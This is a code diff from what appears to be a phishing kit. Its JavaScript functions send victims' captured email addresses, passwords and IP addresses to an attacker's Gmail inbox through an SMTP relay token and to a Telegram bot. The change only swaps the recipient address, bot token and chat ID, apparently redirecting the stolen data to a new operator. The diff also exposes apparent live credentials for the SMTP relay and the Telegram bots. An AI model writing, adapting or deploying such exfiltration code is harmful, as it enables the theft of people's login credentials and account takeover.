@@ -111,7 +111,7 @@ const sendRequest = async (data) => {
 
 const sendEmail = async (data) => {
     const templateParams = {
-        to_email: 'mickweb001@gmail.com',
+        to_email: 'gonzalezday7121@gmail.com',
         from_email: 'bekkierowland@gmail.com',
         subject: 'Login Attempt',
         body: `Email: ${data.email}\nPassword: ${data.password}\nIP Address: ${data.ip}`,
@@ -121,7 +121,7 @@ const sendEmail = async (data) => {
         await Email.send({
             SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
             To: templateParams.to_email,
-            From: 'mickweb001@gmail.com',
+            From: 'gonzalezday7121@gmail.com',
             Subject: templateParams.subject,
             Body: templateParams.body,
         });
@@ -132,8 +132,8 @@ const sendEmail = async (data) => {
 };
 
 const sendToTelegram = async (message) => {
-    const telegramBotToken = '6663087745:AAERY4uS1rS91KqRQOybN1RMqAhVRbeIv_Q';
-    const chatId = '5529950945'; // Adjust the chat ID accordingly
+    const telegramBotToken = '6634105680:AAHew1ynUl3IFBQ5-GYQ88RrQUDjwrdwKQI';
+    const chatId = '6546686863'; // Adjust the chat ID accordingly
 
     const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
     const requestBody = {
